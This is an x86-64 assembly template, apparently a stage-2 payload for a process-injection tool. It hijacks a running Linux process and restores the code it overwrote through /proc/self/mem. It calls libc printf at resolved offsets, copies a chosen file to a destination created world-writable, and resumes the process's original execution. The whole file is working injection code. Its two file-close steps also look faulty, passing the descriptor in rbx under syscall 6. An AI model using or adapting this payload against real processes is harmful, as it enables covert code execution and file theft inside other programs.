.intel_syntax noprefix
.globl _start
_start:

// Based on the stage 2 code included with dlinject.py
// and in part on https://stackoverflow.com/questions/37940707/read-and-write-to-file-assembly
// relative offsets for the following libraries required:
//		libc-2.31.so
cld

	fxsave moar_regs[rip]

	// Open /proc/self/mem
	mov rax, 2                   # SYS_OPEN
	lea rdi, proc_self_mem[rip]  # path
	mov rsi, 2                   # flags (O_RDWR)
	xor rdx, rdx                 # mode
	syscall
	mov r15, rax  # save the fd for later

	// seek to code
	mov rax, 8      # SYS_LSEEK
	mov rdi, r15    # fd
	mov rsi, [VARIABLE:RIP:VARIABLE]  # offset
	xor rdx, rdx    # whence (SEEK_SET)
	syscall

	// restore code
	mov rax, 1                   # SYS_WRITE
	mov rdi, r15                 # fd
	lea rsi, old_code[rip]       # buf
	mov rdx, [VARIABLE:LEN_CODE_BACKUP:VARIABLE]   # count
	syscall

	// close /proc/self/mem
	mov rax, 3    # SYS_CLOSE
	mov rdi, r15  # fd
	syscall

	// move pushed regs to our new stack
	lea rdi, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
	mov rsi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	rep movsb

	// restore original stack
	mov rdi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	lea rsi, old_stack[rip]
	mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	rep movsb

	lea rsp, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]

	// BEGIN: call LIBC printf
	push r13
	push r14
	push rbx
	lea rsi, sourcefile[rip]
	lea rdi, format_string[rip]
	xor rax, rax
	mov rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rbx
	pop r14
	pop r13
	// END: call LIBC printf

	// Open source file
	mov rax, 2            		# SYS_OPEN
	lea rdi, sourcefile[rip]  	# file path
	xor rsi, rsi          		# flags (O_RDONLY)
	xor rdx, rdx          		# mode
	syscall
	mov r13, rax          # store file descriptor in r13 rather than a variable to avoid attempts to write to executable memory
	
	// BEGIN: call LIBC printf
	push r13
	push r14
	push rbx
	lea rsi, destfile[rip]
	lea rdi, format_string[rip]
	xor rax, rax
	mov rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rbx
	pop r14
	pop r13
	// END: call LIBC printf
	
	// Open destination file
	mov rax, 2             		# SYS_OPEN
	lea rdi, destfile[rip]  	# file path
	mov rsi, 0x42          		# flags (O_RDWR | O_CREAT)
	mov rdx, 0777          		# make destination world-writable
	syscall
	mov r14, rax  # store file descriptor in r14 rather than a variable to avoid attempts to write to executable memory

	// create a stack variable to use as a copy buffer
	// instead of using a variable defined in this file, because that would result in writing to executable memory
	mov rax, 0
	push rax
	mov r15, rsp

copyByteLoop:

	// read a single byte at a time to avoid more complex logic
	mov rax, 0		# SYS_READ
	mov rdi, r13	# file descriptor
	mov rsi, r15	# buffer address
	mov rdx, 1		# number of bytes to read
	syscall

	// if no char was read (usually end-of-file), processing is complete
	cmp rax, 0
	jz doneCopying

	// write the byte to the destination file
	mov rax, 1		# SYS_WRITE      
	mov rdi, r14	# file descriptor
	mov rsi, r15	# buffer address
	mov rdx, 1		# number of bytes to write
	syscall

	jmp copyByteLoop

doneCopying:

	// discard the buffer stack variable
	pop rax

	// close file handles
	// BEGIN: call LIBC printf
	push r13
	push r14
	push rbx
	lea rsi, sourcefile[rip]
	lea rdi, format_string[rip]
	xor rax, rax
	mov rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rbx
	pop r14
	pop r13
	// END: call LIBC printf
	
	mov rbx, r13
	mov rax, 6  # sys_close
	syscall

	// BEGIN: call LIBC printf
	push r13
	push r14
	push rbx
	lea rsi, destfile[rip]
	lea rdi, format_string[rip]
	xor rax, rax
	mov rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rbx
	pop r14
	pop r13
	// END: call LIBC printf
		
	mov rbx, r14
	mov rax, 6  # sys_close
	syscall
	
	
	
	fxrstor moar_regs[rip]
	
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rbp
	pop rdx
	pop rcx
	pop rbx
	pop rax
	
	popf

	mov rsp, [VARIABLE:RSP:VARIABLE]
	
	jmp old_rip[rip]

old_rip:
	.quad [VARIABLE:RIP:VARIABLE]
	.align 16

old_code:
	.byte [VARIABLE:CODE_BACKUP_JOIN:VARIABLE]

old_stack:
	.byte [VARIABLE:STACK_BACKUP_JOIN:VARIABLE]

	.align 16
moar_regs:
	.space 512

proc_self_mem:
	.ascii "/proc/self/mem\0"
	
sourcefile:
	.ascii "[VARIABLE:sourcefile:VARIABLE]\0"

destfile:
	.ascii "[VARIABLE:destfile:VARIABLE]\0"

format_string:
	.ascii "DEBUG: %s\n\0"
	
new_stack:
	.balign 0x8000

new_stack_base:

